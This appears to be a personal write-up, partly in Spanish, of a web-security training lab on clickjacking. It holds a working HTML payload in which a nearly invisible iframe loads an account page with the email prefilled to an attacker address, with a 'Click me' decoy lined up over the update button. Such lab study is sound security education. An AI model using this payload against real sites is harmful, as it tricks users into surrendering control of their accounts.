# 02 Lab: Clickjacking with form input data prefilled from a URL parameter

```jsx
This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter
```

Debemos crear un enlace, con el fondo oculto, en donde enviemos una petición por GET, esta petición sera el cambio de correo, pero al haber un token csrf, deberá ser enviado con al información del usuario

```jsx
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Ahora vamos a adaptarlo con nuestros datos, acorde al ejercicio anterior

```jsx
<style>
    iframe {
        position:relative;
				width:700px;
        height: 700px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a810019038734a78383551b007600b1.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

![image.png](02%20Lab%20Clickjacking%20with%20form%20input%20data%20prefilled%20a98d562fe21e4af5b801b07e21f4c874/image.png)

![image.png](02%20Lab%20Clickjacking%20with%20form%20input%20data%20prefilled%20a98d562fe21e4af5b801b07e21f4c874/image%201.png)